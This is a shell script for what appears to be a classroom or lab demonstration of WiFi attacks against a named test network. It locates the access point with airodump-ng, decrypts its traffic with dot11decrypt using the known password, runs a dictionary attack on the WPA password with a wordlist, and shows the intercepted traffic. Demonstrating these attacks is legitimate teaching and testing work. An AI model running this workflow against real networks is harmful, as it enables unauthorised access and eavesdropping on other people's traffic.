#!/bin/bash

WIFI_SSID="WPA2_Test_WiFi"
WIFI_PASSWORD="000999888"

sudo rm -f scan_results* handshake_demo*

echo "[*] Searching for $WIFI_SSID..."
sudo timeout 5s airodump-ng --essid "$WIFI_SSID" -w scan_results --output-format csv $WIFI_INTERFACE > /dev/null 2>&1

WIFI_BSSID=$(grep -m 1 "$WIFI_SSID" scan_results-01.csv | cut -d, -f1)

# Clean up scan files
rm scan_results-01.csv 2>/dev/null

if [ -z "$WIFI_BSSID" ]; then
    echo -e "\033[91m[!] Could not find BSSID. Check if RaspAP is actually on Channel 6.\033[0m"
    exit 1
fi

echo -e "\033[92m[+] Found BSSID: $WIFI_BSSID\033[0m"

# Decryptor WIFI_INTERFACE
echo -e "\033[92m[+] Starting dot11decrypt on $WIFI_INTERFACE...\033[0m"
sudo ./d11decrypt $WIFI_INTERFACE wpa:$WIFI_SSID:$WIFI_PASSWORD &
DECRYPT_PID=$!

echo -e "\033[92m[+] dot11decrypt running with PID $DECRYPT_PID\033[0m"

# Start wifi password crack demo
WORDLIST="Top204Thousand-WPA-probable-v2.txt"
python crack_pass.py --interface $WIFI_INTERFACE --bssid $WIFI_BSSID --channel 6 --wordlist $WORDLIST

read -p "Press Enter to start traffic view..."

# Start intercepted traffic view
sudo python3 ../open_wifi/main.py --interface tap0

# input and shutdown for now
read -p "Press Enter to exit..."

# Stop dot11decrypt
sudo kill $DECRYPT_PID
echo -e "\033[92m[+] dot11decrypt stopped. Exiting.\033[0m"